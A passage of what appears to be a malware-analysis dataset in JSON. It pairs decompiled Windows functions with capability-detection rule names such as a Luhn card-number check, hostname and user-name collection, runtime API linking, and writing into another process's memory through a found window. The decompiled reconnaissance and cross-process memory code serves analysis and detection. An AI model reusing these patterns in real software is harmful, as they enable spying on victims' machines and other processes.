        "decompiled_code": "\nvoid fcn.0048b1f8(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x48b20f;\n    fcn.004059cc();\n    uStack32 = 0x48b2dd;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack40 = 0x48b225;\n    puStack28 = &stack0xfffffffc;\n    fcn.00405530();\n    uStack44 = 0x48b2b5;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00421708();\n    fcn.004217a0();\n    fcn.004218e4();\n    cVar1 = fcn.0042230c();\n    if (cVar1 == '\\0') {\n        fcn.00405530();\n        *in_FS_OFFSET = uStack48;\n    }\n    else {\n        fcn.004218e4();\n        cVar1 = fcn.00422264();\n        if (cVar1 != '\\0') {\n            fcn.00422068();\n        }\n        *in_FS_OFFSET = uStack48;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x48b2e4;\n    uStack32 = 0x48b2dc;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 391
    },
    "0048b314": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048b314(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    puStack28 = 0x48b32b;\n    fcn.004059cc();\n    puStack28 = 0x48b333;\n    fcn.004059cc();\n    uStack32 = 0x48b3f3;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x48b3c7;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack28 = &stack0xfffffffc;\n    fcn.00421708();\n    fcn.004217a0();\n    fcn.004218e4();\n    cVar1 = fcn.0042230c();\n    if (cVar1 == '\\0') {\n        fcn.00421808();\n        *in_FS_OFFSET = uStack48;\n    }\n    else {\n        fcn.004218e4();\n        fcn.00422008();\n        *in_FS_OFFSET = uStack48;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x48b3fa;\n    uStack32 = 0x48b3f2;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 365
    },
    "0048bf2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0048bf2c(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 4;\n    do {\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    fcn.00409d70();\n    return;\n}\n",
        "token_count": 64
    },
    "0048bf54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048bf54(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x48bf6b;\n    fcn.004059cc();\n    uStack36 = 0x48c05c;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack44 = 0x48bf81;\n    puStack32 = &stack0xfffffffc;\n    fcn.00405530();\n    uStack48 = 0x48c027;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    fcn.00421708();\n    fcn.004217a0();\n    fcn.004218e4();\n    cVar1 = fcn.0042230c();\n    if (cVar1 == '\\0') {\n        fcn.00405530();\n        *in_FS_OFFSET = uStack52;\n    }\n    else {\n        fcn.004218e4();\n        cVar1 = fcn.00422264();\n        if (cVar1 == '\\0') {\n            fcn.00405584();\n        }\n        else {\n            fcn.00422068();\n        }\n        *in_FS_OFFSET = uStack52;\n        puStack44 = 0x48c046;\n        fcn.00404650();\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x48c063;\n    uStack36 = 0x48c05b;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 423
    },
    "0048c0a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048c0a4(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    puStack28 = 0x48c0bb;\n    fcn.004059cc();\n    puStack28 = 0x48c0c3;\n    fcn.004059cc();\n    uStack32 = 0x48c18a;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x48c15e;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack28 = &stack0xfffffffc;\n    fcn.00421708();\n    fcn.004217a0();\n    fcn.004218e4();\n    cVar1 = fcn.0042230c();\n    if (cVar1 == '\\0') {\n        fcn.00421808();\n        *in_FS_OFFSET = uStack48;\n    }\n    else {\n        fcn.004218e4();\n        fcn.00422008();\n        fcn.00404650();\n        *in_FS_OFFSET = uStack48;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x48c191;\n    uStack32 = 0x48c189;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 372
    },
    "0048c308": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048c308(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uVar2;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint hObject;\n    uint var_8h;\n    uint var_4h;\n    double dVar3;\n    \n    puStack44 = &stack0xfffffffc;\n    puStack32 = 0x48c31f;\n    fcn.004059cc();\n    puStack32 = 0x48c327;\n    fcn.004059cc();\n    uStack36 = 0x48c3d3;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uStack48 = 0x48c3a7;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack56 = 0x48c350;\n    puStack32 = &stack0xfffffffc;\n    fcn.0040a16c();\n    uStack60 = 0x48c396;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack56 = &stack0xfffffffc;\n    fVar1 = fcn.0040d218();\n    dVar3 = fVar1;\n    fcn.0040a7bc(SUB84(dVar3, 0), dVar3 >> 0x20);\n    uVar2 = SUB84(dVar3, 0);\n    fcn.0040a3ac();\n    *in_FS_OFFSET = uVar2;\n    uStack64 = 0x48c39d;\n    sub.kernel32.dll_CloseHandle_1();\n    return;\n}\n",
        "token_count": 429
    },
    "0048c3e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048c3e4(uint arg_8h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x48c401;\n    fcn.00405fe8();\n    uStack24 = 0x48c473;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.00408560();\n    fcn.004055c8();\n    iStack32 = fcn.004059dc();\n    iVar1 = sub.kernel32.dll_LoadLibraryA();\n    if (iVar1 != 0) {\n        pcVar2 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x48c484);\n        (*pcVar2)();\n        sub.kernel32.dll_FreeLibrary_1();\n        iStack32 = iVar1;\n    }\n    *in_FS_OFFSET = iStack32;\n    uStack24 = 0x48c47a;\n    iStack28 = 0x48c464;\n    fcn.00405530();\n    iStack28 = 0x48c472;\n    fcn.004060ac();\n    return;\n}\n",
        "token_count": 322
    },
    "0048c618": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0048c618(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack332;\n    uint uStack328;\n    uchar *puStack324;\n    int32_t iStack320;\n    uint uStack316;\n    uchar *puStack312;\n    uint var_122h;\n    uint lpFileOp;\n    uint var_1eh;\n    uint *var_1ah;\n    uint var_12h;\n    uint var_4h;\n    \n    puStack324 = &stack0xfffffffc;\n    puStack312 = 0x48c62f;\n    fcn.004059cc();\n    uStack316 = 0x48c6d9;\n    iStack320 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec0;\n    uStack328 = 0x48c6b7;\n    iStack332 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffeb4;\n    puStack312 = &stack0xfffffffc;\n    fcn.00403af4();\n    fcn.00403af4();\n    fcn.0040a928();\n    lpFileOp = 0;\n    var_1ah = &fcn.0048c618::var_122h;\n    var_1eh = 3;\n    var_12h._0_2_ = 0x54;\n    sub.shell32.dll_SHFileOperationA();\n    *in_FS_OFFSET = &fcn.0048c618::lpFileOp;\n    *in_FS_OFFSET = puStack324;\n    uStack316 = 0x48c6e0;\n    iStack320 = 0x48c6d8;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 390
    },
    "0048ca28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get disk information"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048ca28(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack320;\n    uint uStack316;\n    uchar *puStack312;\n    uint uStack308;\n    uint uStack304;\n    uchar *puStack300;\n    uint var_115h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack312 = &stack0xfffffffc;\n    puStack300 = 0x48ca42;\n    var_8h = param_2;\n    fcn.004059cc();\n    uStack304 = 0x48cacf;\n    uStack308 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffecc;\n    uStack316 = 0x48caa2;\n    uStack320 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec0;\n    uVar3 = 0;\n    puStack300 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc(0, 0, 0, &fcn.0048ca28::var_ch, &fcn.0048ca28::var_10h, &fcn.0048ca28::var_115h, 0x105);\n    iVar2 = sub.kernel32.dll_GetVolumeInformationA();\n    if (iVar2 != 0) {\n        fcn.0040aaa8();\n    }\n    *in_FS_OFFSET = uVar1;\n    *in_FS_OFFSET = uVar3;\n    fcn.00405530(0x48cad6);\n    return;\n}\n",
        "token_count": 384
    },
    "0048caf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048caf0(uint param_1, char param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    puStack44 = 0x48cb09;\n    fcn.004059cc();\n    uStack48 = 0x48cba6;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uStack60 = 0x48cb79;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack44 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc(&fcn.0048caf0::var_10h, &fcn.0048caf0::var_18h);\n    iVar2 = (***0x4949dc)();\n    if (iVar2 != 0) {\n        if (param_2 == '\\0') {\n            fcn.0048c21c(SUB108(_var_10h, 0), _var_10h >> 0x40);\n        }\n        else {\n            fcn.0048c21c(SUB108(_var_18h, 0), _var_18h >> 0x40);\n        }\n    }\n    *in_FS_OFFSET = uVar1;\n    *in_FS_OFFSET = 0;\n    uStack60 = 0x48cbad;\n    uStack64 = 0x48cba5;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 418
    },
    "0048ce74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get session user name"
        ],
        "decompiled_code": "\nvoid fcn.0048ce74(void)\n\n{\n    int32_t iVar1;\n    uint uStack264;\n    uchar auStack260 [256];\n    \n    uStack264 = 0x100;\n    iVar1 = sub.advapi32.dll_GetUserNameA(auStack260, &uStack264);\n    if (iVar1 == 0) {\n        fcn.00405530();\n    }\n    else {\n        fcn.0040aaa8();\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "0048ceb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get hostname"
        ],
        "decompiled_code": "\nvoid fcn.0048ceb0(void)\n\n{\n    int32_t iVar1;\n    uint uStack264;\n    uchar auStack260 [256];\n    \n    uStack264 = 0x100;\n    iVar1 = sub.kernel32.dll_GetComputerNameA(auStack260, &uStack264);\n    if (iVar1 == 0) {\n        fcn.00405530();\n    }\n    else {\n        fcn.0040aaa8();\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "0048d0fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048d0fc(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    puStack36 = 0x48d116;\n    fcn.004059cc();\n    puStack36 = 0x48d11e;\n    fcn.004059cc();\n    uStack40 = 0x48d1d8;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x48d138;\n    puStack36 = &stack0xfffffffc;\n    fcn.004216c4();\n    uStack52 = 0x48d1b6;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    uStack64 = 0x48d189;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack48 = &stack0xfffffffc;\n    fcn.004217a0();\n    fcn.004218e4();\n    fcn.00422068();\n    *in_FS_OFFSET = uStack68;\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x48d1bd;\n    uStack52 = 0x48d1b5;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 392
    },
    "0048d6a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "identify system language via API"
        ],
        "decompiled_code": "\nvoid fcn.0048d6a4(void)\n\n{\n    ushort uVar1;\n    uchar auStack108 [104];\n    \n    uVar1 = sub.kernel32.dll_GetUserDefaultLangID();\n    sub.kernel32.dll_VerLanguageNameA(uVar1, auStack108, 100);\n    fcn.004057a0();\n    return;\n}\n",
        "token_count": 78
    },
    "0048d900": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0048d900(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint *puStack36;\n    uint uStack28;\n    uint uStack20;\n    \n    uVar5 = 0;\n    uStack20 = 0;\n    iVar4 = 0;\n    puStack36 = &uStack20;\n    uStack40 = 0;\n    uStack44 = 0;\n    uStack48 = 1;\n    uStack52 = in_EAX;\n    uStack28 = param_2;\n    iVar1 = sub.advapi32.dll_GetTokenInformation();\n    if (iVar1 == 0) {\n        iVar1 = sub.kernel32.dll_GetLastError_1();\n        if (iVar1 != 0x7a) {\n            return 0;\n        }\n        uVar2 = sub.kernel32.dll_GetProcessHeap(8, uStack40);\n        iVar4 = sub.kernel32.dll_HeapAlloc(uVar2);\n        uVar3 = uStack52;\n        if (iVar4 == 0) {\n            return 0;\n        }\n        uStack52 = 0;\n        iVar1 = sub.advapi32.dll_GetTokenInformation(uVar2, 1, iVar4, uVar3, &uStack52);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    iVar1 = fcn.0048d734();\n    if (iVar1 != 0) {\n        uVar3 = sub.kernel32.dll_GetProcessHeap(0, iVar4);\n        iVar1 = sub.kernel32.dll_HeapFree(uVar3);\n        if (iVar1 != 0) {\n            uVar5 = 0xffffffff;\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 438
    },
    "0048d9b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048d9b0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint in_stack_fffffecc;\n    uint uStack296;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uchar auStack280 [272];\n    \n    puStack284 = 0x48d9c1;\n    fcn.00405530();\n    uStack288 = 0xffffffff;\n    uStack292 = 8;\n    uStack296 = 0x48d9cb;\n    puStack284 = &stack0xfffffee8;\n    uStack296 = sub.kernel32.dll_GetCurrentThread();\n    iVar1 = sub.advapi32.dll_OpenThreadToken();\n    if (iVar1 == 0) {\n        iVar2 = sub.kernel32.dll_GetLastError_1();\n        if (iVar2 == 0x3f0) {\n            in_stack_fffffecc = sub.kernel32.dll_GetCurrentProcess(8, &stack0xfffffed8);\n            iVar1 = sub.advapi32.dll_OpenProcessToken(in_stack_fffffecc);\n        }\n    }\n    if (iVar1 != 0) {\n        fcn.00403af4();\n        iVar1 = fcn.0048d900();\n        if (iVar1 != 0) {\n            fcn.004057a0();\n        }\n        sub.kernel32.dll_CloseHandle_1(in_stack_fffffecc);\n    }\n    return;\n}\n",
        "token_count": 320
    },
    "0048dd0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get memory capacity"
        ],
        "decompiled_code": "\nvoid fcn.0048dd0c(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack88;\n    int32_t iStack84;\n    uchar *puStack80;\n    int32_t iStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint lpBuffer;\n    uint var_20h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    puStack80 = &stack0xfffffffc;\n    var_28h = 0;\n    uStack72 = 0x48ddad;\n    iStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    iStack84 = 0x48dd80;\n    iStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    lpBuffer = 0x20;\n    sub.kernel32.dll_GlobalMemoryStatus(&fcn.0048dd0c::lpBuffer);\n    arg_8h = &fcn.0048dd0c::var_28h;\n    fcn.0040af98(arg_8h);\n    fcn.00405864();\n    *in_FS_OFFSET = arg_8h;\n    *in_FS_OFFSET = iStack84;\n    iStack76 = 0x48ddb4;\n    puStack80 = 0x48ddac;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 343
    },
    "0048dde0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nvoid fcn.0048dde0(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x48ddfb;\n    fcn.004059cc();\n    uStack32 = 0x48de71;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc(10);\n    uVar1 = sub.kernel32.dll_FindResourceA(0, uVar1);\n    uVar2 = sub.kernel32.dll_LoadResource(0, uVar1);\n    sub.kernel32.dll_SizeofResource(0, uVar1);\n    sub.kernel32.dll_LockResource(uVar2);\n    fcn.00405620();\n    fcn.00405584();\n    sub.kernel32.dll_FreeResource();\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x48de78);\n    return;\n}\n",
        "token_count": 260
    },
    "0048deec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048deec(uint param_1, char param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_4h;\n    \n    if (param_2 != '\\0') {\n        puStack36 = 0x48deff;\n        fcn.00404974();\n    }\n    uStack40 = 0x48df3a;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.0048bf2c();\n    fcn.00405584();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x48df41;\n    uStack40 = 0x48df39;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 200
    },
    "0048e06c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "find graphical window",
            "write process memory"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048e06c(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    uint uVar6;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t wParam;\n    uint hWndParent;\n    uint lpdwProcessId;\n    uint lpNumberOfBytesWritten;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    puStack72 = 0x48e097;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack72 = 0x48e09f;\n    fcn.004059cc();\n    uStack76 = 0x48e273;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    fcn.0048dff0();\n    uVar1 = fcn.004059dc();\n    uVar1 = sub.user32.dll_FindWindowA(0x48e284, uVar1);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x48e284, 0);\n    uVar2 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x48e28c, 0);\n    uVar1 = uVar2;\n    var_20h = sub.user32.dll_SendMessageA(uVar2, 0x1004, 0, 0);\n    if (-1 < var_20h + -1) {\n        wParam = 0;\n        do {\n            puVar3 = sub.kernel32.dll_VirtualAlloc_1(0, 300, 0x3000, 4);\n            sub.user32.dll_GetWindowThreadProcessId(uVar2, &fcn.0048e06c::lpdwProcessId);\n            uVar1 = sub.kernel32.dll_OpenProcess(0x38, 0, lpdwProcessId);\n            iVar4 = sub.kernel32.dll_VirtualAllocEx(uVar1, 0, 300, 0x3000, 4);\n            *puVar3 = 1;\n            puVar3[1] = 0;\n            puVar3[2] = 0;\n            puVar3[5] = iVar4 + 0x28;\n            puVar3[6] = 100;\n            sub.kernel32.dll_WriteProcessMemory(uVar1, iVar4, puVar3, 0x400, &fcn.0048e06c::lpNumberOfBytesWritten);\n            sub.user32.dll_SendMessageA(uVar2, 0x102d, wParam, iVar4);\n            uVar6 = uVar1;\n            sub.kernel32.dll_ReadProcessMemory();\n            uVar5 = puVar3 == 0xffffffd8;\n            fcn.00405728();\n            fcn.00409b7c();\n            fcn.00409b7c(0);\n            fcn.00405974();\n            if (uVar5) {\ncode_r0x0048e20a:\n                uVar6 = uVar2;\n                sub.user32.dll_SendMessageA();\n            }\n            else {\n                fcn.00409b7c();\n                fcn.00409b7c(0);\n                fcn.00405974();\n                if (uVar5) goto code_r0x0048e20a;\n            }\n            sub.kernel32.dll_VirtualFree_1(puVar3, 0, 0x8000, uVar6);\n            sub.kernel32.dll_VirtualFreeEx(uVar1, iVar4, 0, 0x8000);\n            sub.kernel32.dll_CloseHandle_1();\n            wParam = wParam + 1;\n            var_20h = var_20h + -1;\n        } while (var_20h != 0);\n    }\n    *in_FS_OFFSET = uVar1;\n    fcn.00405554(0x48e27a);\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 977
    },
    "00420f54": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420f54(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *in_FS_OFFSET;\n    ulong uVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x420fb7;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    if (arg_ch != 0) {\n        *(arg_ch + 4) = 2;\n        uVar1 = (****(arg_8h + 0xc))();\n        *(arg_ch + 8) = uVar1;\n        *(arg_ch + 0xc) = uVar1 >> 0x20;\n        *(arg_ch + 0x10) = 0;\n        *(arg_ch + 0x14) = 0;\n        *(arg_ch + 0x18) = 0;\n        *(arg_ch + 0x1c) = 0;\n        *(arg_ch + 0x20) = 0;\n        *(arg_ch + 0x24) = 0;\n        *(arg_ch + 0x2c) = 1;\n    }\n    *in_FS_OFFSET = uStack28;\n    return 0;\n}\n",
        "token_count": 293
    },
    "004251cc": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.004251cc(void)\n\n{\n    int32_t iVar1;\n    char extraout_DL;\n    \n    iVar1 = fcn.00404a1c();\n    fcn.00419c1c();\n    fcn.0042579c();\n    fcn.00404650();\n    fcn.00404650();\n    fcn.00404650();\n    sub.kernel32.dll_DeleteCriticalSection(iVar1 + 0x38);\n    fcn.00419e14();\n    if ('\\0' < extraout_DL) {\n        fcn.004049c4();\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "0042535c": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042535c(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    \n    (**(*in_EAX + 0x10))();\n    fcn.004257f0();\n    uVar1 = fcn.00424fec();\n    sub.user32.dll_FillRect(in_EAX[1], param_2, uVar1);\n    (**(*in_EAX + 0xc))();\n    return;\n}\n",
        "token_count": 110
    },
    "00425424": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00425424(int32_t *param_1)\n\n{\n    int32_t *in_EAX;\n    \n    if (param_1 != NULL) {\n        (**(*in_EAX + 0x10))();\n        fcn.004257f0();\n        (**(*param_1 + 0x14))();\n        (**(*in_EAX + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 92
    },
    "004272e4": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004272e4(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    cVar1 = fcn.004047dc();\n    if (cVar1 == '\\0') {\n        fcn.00404650();\n        *(in_EAX + 0xc) = 0;\n        iVar2 = (**(param_2 + 0x48))();\n        *(in_EAX + 0xc) = iVar2;\n        *(iVar2 + 0x14) = in_EAX;\n        uVar3 = fcn.00404864();\n        *(iVar2 + 0x10) = uVar3;\n        *(iVar2 + 0x1c) = in_EAX;\n        uVar3 = fcn.00404864();\n        *(iVar2 + 0x18) = uVar3;\n        fcn.0040484c();\n    }\n    return;\n}\n",
        "token_count": 227
    },
    "0044d894": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
